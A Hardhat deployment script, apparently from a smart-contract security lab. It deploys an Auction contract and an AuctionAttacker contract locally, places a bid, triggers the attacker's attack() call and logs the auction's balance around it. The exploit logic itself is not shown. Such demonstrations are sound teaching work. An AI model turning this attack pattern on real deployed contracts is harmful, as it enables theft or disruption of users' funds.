// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {

  const [owner] = await hre.ethers.getSigners();

  const sendAmountOwner1 = hre.ethers.parseEther("0.05");
  const sendAmountOwner2 = hre.ethers.parseEther("1");
  const sendAmountAttacker = hre.ethers.parseEther("0.2");

  const auction = await hre.ethers.deployContract("Auction");

  await auction.waitForDeployment();
  const auctionAddress = auction.target

  const attacker = await hre.ethers.deployContract("AuctionAttacker", [auctionAddress], {
    value: sendAmountAttacker,
  });

  await attacker.waitForDeployment();

  // Initial auction bal
  let auctiontBal = await hre.ethers.provider.getBalance(auctionAddress);
  console.log(`Balance of Auction contract at ${auctionAddress} is ${hre.ethers.formatEther(auctiontBal)}`);

  await auction.connect(owner).bid({ value: sendAmountOwner1 });

  // Auction bal after funding
  auctiontBal = await hre.ethers.provider.getBalance(auctionAddress);
  console.log(`Balance of Auction contract at ${auctionAddress} is ${hre.ethers.formatEther(auctiontBal)}`);

  // Call from attacker contract
  await attacker.attack();

  // Auction bal after attack
  auctiontBal = await hre.ethers.provider.getBalance(auctionAddress);
  console.log(`Balance of Auction contract at ${auctionAddress} is ${hre.ethers.formatEther(auctiontBal)}`);

  await auction.connect(owner).bid({ value: sendAmountOwner2 });
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
